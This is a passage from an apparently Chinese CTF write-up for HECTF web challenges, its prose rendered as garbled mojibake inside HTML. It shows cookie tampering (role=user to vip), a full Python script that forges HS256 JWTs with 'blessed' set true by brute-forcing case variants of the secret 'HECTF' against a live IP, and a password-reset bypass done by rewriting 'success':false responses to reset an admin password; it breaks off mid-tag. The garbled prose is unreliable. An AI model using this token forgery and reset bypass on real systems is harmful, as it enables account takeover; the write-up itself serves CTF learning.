å‹‡è€…èƒ½è¿›ï¼Œç‚¹å‡»è·å–ä»¤ç‰Œï¼Œç„¶åæŠ“åŒ…å‘ç° Cookieï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=user; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicGxheWVyIiwiYmxlc3NlZCI6ZmFsc2UsImV4cCI6MTc2NjIyNTY0OH0.H10-DibPmALQ0RyNSp08JlQlL4Rmc7wo8cOd1kau1-U</span><br></pre></td></tr></table></figure><p>â€‹çœ‹èµ·æ¥æ˜¯ Jwt è§£å¯†ï¼Œrole ä¹Ÿæ˜¯ userï¼Œå§‘ä¸”æŠŠ user æ¢æˆ vipï¼ˆè¿™é‡Œæ˜¯å°å†™ï¼Œå› ä¸ºå¤§å†™ç»•ä¸è¿‡ï¼‰ç»•è¿‡ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5bb50394aa244e94b547393321dd3775.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>VIP é€šé“ç•…é€šï¼ä½†å®è—ä»è¢«å°å°â€¦â€¦</p></blockquote><p>â€‹è¯´æ˜å¾—å¼€ç¬¬ä¸‰é—¨ï¼ŒJwt è§£å¯†çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/1f975b6985d74ee79114d697ef570032.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ¹æ®è¿™ä¸ªçŒœæµ‹æŠŠ blessed æ¢æˆ true å³å¯ï¼Œé‚£ä¹ˆå°±æ˜¯çŒœæµ‹å¯†é’¥çš„é—®é¢˜äº†ï¼Œæ ¹æ®ä¸Šé¢æ³¨é‡Šï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    A: ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿæˆ‘ä»¬æ˜¯ä¸æ˜¯å¥½å…„å¼Ÿï¼Œä½ èƒŒç€æˆ‘å·å·æ‰“ä»€ä¹ˆæ¯”èµ›ï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line">    B: æ²¡æœ‰å•¦ï¼Œä½ è¦æ‰“å—ï¼ŒHECTFï¼Œæ¥ç©å§ã€‚</span><br><span class="line">    A: å¯ä»¥å•Šï¼å¤Ÿå…„å¼Ÿçš„ï¼ŒHECTFæ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œæˆ‘å»æœæœã€‚</span><br><span class="line">    B: å˜¿å˜¿ï¼Œè¿™æ˜¯ç§˜å¯†ï¼Œä½ è¯•è¯•å°±çŸ¥é“å•¦ã€‚</span><br><span class="line">    A: è¡Œå§ï¼Œä½ çœŸè®¨åŒã€‚</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>â€‹å…ˆè¯´äº† HECTF æ˜¯å¤§å†™è¿˜æ˜¯å°å†™ï¼Œç„¶ååé¢åˆè¯´äº† è¿™æ˜¯ç§˜å¯†ï¼Œè‰ï¼Œå‘åœ¨è¿™é‡Œå•Šï¼ŒHECTF å°±æ˜¯å¯†é’¥ï¼Œå—ï¼Ÿé‚£ä¹ˆå¯†é’¥çš„å¤§å†™å’Œå°å†™å°±æ˜¯é—®é¢˜äº†ï¼Œç›´æ¥çˆ†ç ´ï¼Œä¸‹é¢è¿™ä¸ªä»£ç ç›´æ¥è¿è¡Œå°±èƒ½çˆ†ç ´å‡º flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_hectf_jwt_list</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆå¯¹åº”çš„JWTåˆ—è¡¨ï¼ˆè¿”å›ï¼š[(å¯†é’¥, JWTä»¤ç‰Œ), ...]ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. å›ºå®šJWT Headerï¼ˆä¸ä½ æä¾›çš„tokenæ ¼å¼ä¸€è‡´ï¼‰</span></span><br><span class="line">    jwt_header = &#123;</span><br><span class="line">        <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">        <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. å›ºå®šJWT Payloadï¼ˆä¸ä½ æä¾›çš„tokenè½½è·ä¸€è‡´ï¼Œå¯æŒ‰éœ€è°ƒæ•´blessed/expå­—æ®µï¼‰</span></span><br><span class="line">    jwt_payload = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;player&quot;</span>,</span><br><span class="line">        <span class="string">&quot;blessed&quot;</span>: <span class="literal">True</span>,  <span class="comment"># å¯å°è¯•æ”¹ä¸ºFalseæµ‹è¯•ä¸åŒçŠ¶æ€</span></span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1766225297</span>  <span class="comment"># è‹¥æç¤ºä»¤ç‰Œè¿‡æœŸï¼Œå¯æ”¹ä¸ºå½“å‰æ—¶é—´æˆ³+3600ï¼ˆä¾‹å¦‚int(time.time())+3600ï¼‰</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆï¼ˆ2^5=32ç§ï¼‰</span></span><br><span class="line">    base_chars = <span class="string">&quot;HECTF&quot;</span></span><br><span class="line">    char_options = [[c.upper(), c.lower()] <span class="keyword">for</span> c <span class="keyword">in</span> base_chars]</span><br><span class="line">    hectf_secret_list = [<span class="string">&#x27;&#x27;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*char_options)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. ç”Ÿæˆæ¯ä¸ªå¯†é’¥å¯¹åº”çš„JWT</span></span><br><span class="line">    jwt_list = []</span><br><span class="line">    <span class="keyword">for</span> secret <span class="keyword">in</span> hectf_secret_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt_token = jwt.encode(</span><br><span class="line">                payload=jwt_payload,</span><br><span class="line">                key=secret,</span><br><span class="line">                algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">                headers=jwt_header</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># å…¼å®¹pyjwtä¸åŒç‰ˆæœ¬çš„è¿”å›æ ¼å¼ï¼ˆéƒ¨åˆ†ç‰ˆæœ¬è¿”å›bytesï¼Œéœ€è½¬ä¸ºå­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(jwt_token, <span class="built_in">bytes</span>):</span><br><span class="line">                jwt_token = jwt_token.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            jwt_list.append((secret, jwt_token))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  å¯†é’¥ <span class="subst">&#123;secret&#125;</span> ç”ŸæˆJWTå¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jwt_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_jwt_batch</span>(<span class="params">target_url, jwt_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰¹é‡æµ‹è¯•JWTæœ‰æ•ˆæ€§ï¼Œç²¾å‡†è¯†åˆ«æ— æ•ˆä»¤ç‰Œå“åº”ï¼Œä¼˜åŒ–è¾“å‡º&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. å›ºå®šè¯·æ±‚å¤´ï¼ˆå¤ç”¨åŸå§‹è¯·æ±‚å¤´ï¼ŒåŠ¨æ€æ›¿æ¢Cookieï¼‰</span></span><br><span class="line">    base_headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.100.66.83:32714/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. å›ºå®šè¯·æ±‚ä½“ï¼ˆå¯æŒ‰éœ€ä¿®æ”¹dooræˆ–courageå‚æ•°ï¼‰</span></span><br><span class="line">    request_body = <span class="string">&quot;door=C&amp;courage=1500&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. æ— æ•ˆä»¤ç‰Œå“åº”æ ‡è¯†ï¼ˆç”¨äºè¿‡æ»¤å†—ä½™è¾“å‡ºï¼‰</span></span><br><span class="line">    invalid_token_msg = <span class="string">&quot;æ— æ•ˆçš„ç¥åœ£ä»¤ç‰Œ&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸš€ å¼€å§‹æ‰¹é‡æµ‹è¯•ï¼Œå…±<span class="subst">&#123;<span class="built_in">len</span>(jwt_list)&#125;</span>ä¸ªJWTä»¤ç‰Œ...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Œ æ— æ•ˆä»¤ç‰Œå“åº”å°†è‡ªåŠ¨æ ‡è®°ï¼Œä»…é«˜äº®å¼‚å¸¸/æœ‰æ•ˆç»“æœ\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># å»¶è¿Ÿ1ç§’ï¼Œä¾¿äºæŸ¥çœ‹æç¤ºä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, (secret, jwt_token) <span class="keyword">in</span> <span class="built_in">enumerate</span>(jwt_list, <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># åŠ¨æ€æ„é€ Cookie</span></span><br><span class="line">        current_headers = base_headers.copy()</span><br><span class="line">        current_headers[<span class="string">&quot;Cookie&quot;</span>] = <span class="string">f&quot;role=VIP; token=<span class="subst">&#123;jwt_token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># å‘é€POSTè¯·æ±‚</span></span><br><span class="line">            response = requests.post(</span><br><span class="line">                url=target_url,</span><br><span class="line">                headers=current_headers,</span><br><span class="line">                data=request_body,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            response_text = response.text.strip()</span><br><span class="line">            status_code = response.status_code</span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ†ç±»è¾“å‡ºç»“æœ</span></span><br><span class="line">            <span class="keyword">if</span> invalid_token_msg <span class="keyword">in</span> response_text <span class="keyword">and</span> status_code == <span class="number">403</span>:</span><br><span class="line">                <span class="comment"># æ— æ•ˆä»¤ç‰Œï¼Œç®€åŒ–è¾“å‡º</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ª | å¯†é’¥: <span class="subst">&#123;secret&#125;</span> | çŠ¶æ€: 403ï¼ˆæ— æ•ˆä»¤ç‰Œï¼‰&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># éæ— æ•ˆä»¤ç‰Œå“åº”ï¼Œè¯¦ç»†è¾“å‡ºï¼ˆå¯èƒ½æ˜¯æœ‰æ•ˆç»“æœæˆ–å…¶ä»–å¼‚å¸¸ï¼‰</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n===== ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ªæµ‹è¯•ï¼ˆéæ— æ•ˆä»¤ç‰Œï¼‰======&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;çŠ¶æ€ç : <span class="subst">&#123;status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å“åº”å†…å®¹: <span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># æ£€æµ‹flagå…³é”®è¯ï¼Œæ‰¾åˆ°æœ‰æ•ˆç»“æœç«‹å³ç»ˆæ­¢</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response_text.lower():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ æ‰¾åˆ°æœ‰æ•ˆJWTï¼å¯†é’¥ï¼š<span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ‰ å®Œæ•´å“åº”ï¼š<span class="subst">&#123;response_text&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> secret, jwt_token</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># è¯·æ±‚å¼‚å¸¸ï¼Œè¯¦ç»†è¾“å‡º</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n===== ç¬¬<span class="subst">&#123;idx:2d&#125;</span>ä¸ªæµ‹è¯•ï¼ˆè¯·æ±‚å¼‚å¸¸ï¼‰======&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;JWT: <span class="subst">&#123;jwt_token&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ å¼‚å¸¸ä¿¡æ¯ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nğŸ” æ‰¹é‡æµ‹è¯•å®Œæˆï¼&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æç¤ºï¼šè‹¥å…¨éƒ¨ä¸º403æ— æ•ˆä»¤ç‰Œï¼Œå¯å°è¯•ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  1. ä¿®æ”¹JWT Payloadä¸­çš„blessedå­—æ®µï¼ˆTrue/Falseäº’æ¢ï¼‰&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  2. æ›´æ–°expæ—¶é—´æˆ³ä¸ºå½“å‰æœ‰æ•ˆæ—¶é—´ï¼ˆé¿å…ä»¤ç‰Œè¿‡æœŸï¼‰&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  3. è°ƒæ•´è¯·æ±‚ä½“ä¸­çš„doorï¼ˆA/B/Cï¼‰æˆ–courageå‚æ•°å€¼&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ç›®æ ‡URL</span></span><br><span class="line">    TARGET_URL = <span class="string">&quot;http://47.100.66.83:31648/enter&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. ç”ŸæˆJWTåˆ—è¡¨</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ğŸ“Œ æ­£åœ¨ç”ŸæˆHECTFæ‰€æœ‰å¤§å°å†™ç»„åˆçš„JWT...&quot;</span>)</span><br><span class="line">    jwt_test_list = generate_hectf_jwt_list()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Œ å…±ç”Ÿæˆ<span class="subst">&#123;<span class="built_in">len</span>(jwt_test_list)&#125;</span>ä¸ªæœ‰æ•ˆJWTä»¤ç‰Œ\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. æ‰¹é‡æµ‹è¯•</span></span><br><span class="line">    valid_secret, valid_jwt = test_jwt_batch(TARGET_URL, jwt_test_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. æœ€ç»ˆç»“æœæ±‡æ€»</span></span><br><span class="line">    <span class="keyword">if</span> valid_secret <span class="keyword">and</span> valid_jwt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâœ… æµ‹è¯•æˆåŠŸï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ‰æ•ˆå¯†é’¥ï¼š<span class="subst">&#123;valid_secret&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ‰æ•ˆJWTï¼š<span class="subst">&#123;valid_jwt&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nâŒ æœªæ‰¾åˆ°æœ‰æ•ˆJWTï¼Œå¯å‚è€ƒæç¤ºè°ƒæ•´å‚æ•°åé‡è¯•ã€‚&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="è°å®¶blogé‡Œæœ‰è¿™åŠŸèƒ½"><a class="markdownIt-Anchor" href="#è°å®¶blogé‡Œæœ‰è¿™åŠŸèƒ½">#</a> è°å®¶ blog é‡Œæœ‰è¿™åŠŸèƒ½ï¼Ÿ</h2><blockquote><p>Bob åœ¨å®¿èˆé‡Œé—²çš„ damn ç–¼ï¼Œä¸çŸ¥é“å¹²ä»€ä¹ˆï¼Œä»–çš„æœ‹å‹ Alice æœ€è¿‘æ•´äº†ä¸ªä¸ªäººåšå®¢ä¸»é¡µï¼Œæœ€è¿‘å‡ å¤©å¤© å¤©åœ¨ä»–é¢å‰ç‚«è€€ï¼Œä»–è§‰å¾—å¿ƒç†å¾ˆä¸çˆ½ï¼Œæœ‰ç§è¢«æœ‹å‹å†…å·è‡ªå·±å´åœ¨æ‘†çƒ‚è€Œæ„Ÿè§‰åˆ°äº†èƒŒå›çš„æ„Ÿè§‰ï¼Œäºæ˜¯ ä»–è´¹å°½å¿ƒåŠ›ç»ˆäºæ£é¼“å‡ºæ¥äº†ä¸€ä¸ªï¼Œä½†æ˜¯ä»–æ“å‡ºæ¥çš„ç½‘ç«™æœ‰ä¸€äº›å…¶ä»–åšå®¢ä½œè€…ä¸ä¼šæœ‰çš„åŠŸèƒ½â€¦</p><p>æ³¨æ„ï¼šç”±äºå‡ºé¢˜äººå­¦è‰ºä¸ç²¾çš„é—®é¢˜ï¼Œåœ¨åšé¢˜è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºç°ç½‘ç«™æ— æ³•è®¿é—®çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯ exit æŠŠ æ•´ä¸ªç¨‹åºåœæ‰äº†ï¼Œè¯·ç­‰å¾…ä¸‰åç§’ï¼Œä¸‰åç§’ååº”è¯¥ä¼šé‡æ–°å¯åŠ¨ï¼Œè‹¥ä¸‰åç§’åæ²¡æœ‰å¯åŠ¨çš„ï¼Œå¯ä»¥é‡å¯ç¯ å¢ƒã€‚</p></blockquote><p>â€‹ä¸€èˆ¬ç±»ä¼¼çš„ CMS çš„é¢˜ç›´æ¥ç™»åå°çˆ†ç ´å¼±å£ä»¤ç¢°ç¢°è¿æ°”ï¼Œä¸è¿‡è¿™ä¸ªæœ‰å¯èƒ½çˆ†ä¸å‡ºæ¥ï¼Œä½†å­˜åœ¨å¿˜è®°å¯†ç çš„æ¥å£ï¼Œè¿™ä¸ªæ˜¯å¾ˆå¤šæ¼æ´çš„å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥èµŒä¸€æŠŠè¯•è¯•çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/0b7f258b54284828a595288be2af6157.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œçœ‹ url ä¼¼ä¹æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæµ‹æµ‹çœ‹æ˜¯å¦å­˜åœ¨è¿™ç§é€»è¾‘æ¼æ´ï¼ˆå‰ç«¯å¯¹åç«¯å“åº”è¿›è¡ŒéªŒè¯ï¼Œç„¶åè·³è½¬åˆ°ç¬¬äºŒä¸ªé‡ç½®å¯†ç çš„é¡µé¢ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€åçš„ä¸€ä¸ªé¡µé¢ï¼Œå½“åç«¯è®¤ä¸ºå‰ä¸¤æ¬¡éªŒè¯å·²ç»å®Œæˆäº†ï¼Œä¸éœ€è¦è¿›è¡Œåç»­éªŒè¯ï¼Œä¹‹ç±»å¯èƒ½ä¼šå­˜åœ¨ä»»æ„å¯†ç ä¿®æ”¹çš„æ´ï¼Œä¸è¿‡å®é™…æƒ…å†µä¸‹åº”è¯¥å¤§éƒ¨åˆ†éƒ½ä¿®äº†ï¼Œæˆ‘è¿™é‡Œåªæ˜¯æ¨¡æ‹Ÿè¿™ä¸ªæ´çš„ç‚¹ï¼Œä¸ä¼šæ ¹å®é™…æƒ…å†µä¸€æ ·ï¼‰ï¼Œè¿™é‡ŒæŠ“ä¸€ä¸‹å“åº”åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d019db2e5564085ab796870ff274f3c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ç›¸åº”åŒ…ä¹‹ç±»å¯ä»¥ä¿®æ”¹ <code>&quot;success&quot;:false</code>  ä¸º <code>&quot;success&quot;:true</code> ï¼ŒæˆåŠŸè·³è½¬åˆ°ç¬¬äºŒæ¬¡éªŒè¯ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a75aba59a26843f48f48e6468991d450.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åéšä¾¿è¾“ï¼ŒæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a45d5b829423438aa2fc8f4c71c039ed.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åŸæœ¬çš„ step1 å˜æˆäº† step2ï¼Œå¯ä»¥çŒœçŒœçœ‹æœ€åçš„ä¸€æ­¥å¯ä»¥æ˜¯ step3 æˆ–è€… step4ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ˜¯è€è€å®å®ä¸€æ­¥æ­¥ä¸‹å»ï¼Œè€æ ·å­ï¼ŒæŠ“ç›¸åº”åŒ…ï¼Œæ”¹å‚æ•°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/4f4729bd09c3481a80760e7c0b7206ad.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸè·³è½¬åˆ°è¿™ä¸€æ­¥ï¼Œé‚£å°±ä¿®æ”¹å¯†ç ä¸º 123ï¼Œä¹‹åæŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/8a4c9d39a2824acb9621a37fdcfb4b65.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åæŠ“ç›¸åº”åŒ…çœ‹çœ‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/3c81973b813449a99324d2e11838bf54.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> 1117210622168.png&amp;pos_id=img-A0YJbOft-1767957868072)</p><p>â€‹è¿™é‡Œæˆ‘æ²¡æ”¹ï¼Œè¯æ˜ä¿®æ”¹å¯†ç æˆåŠŸäº†ï¼Œä¹‹åå°±å¯ä»¥å»ç™»å½•äº†ï¼ŒæˆåŠŸè¿›å…¥åå°ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/b5873968dbb14c21a10c349dcd5c9d1e.png#pic_center" 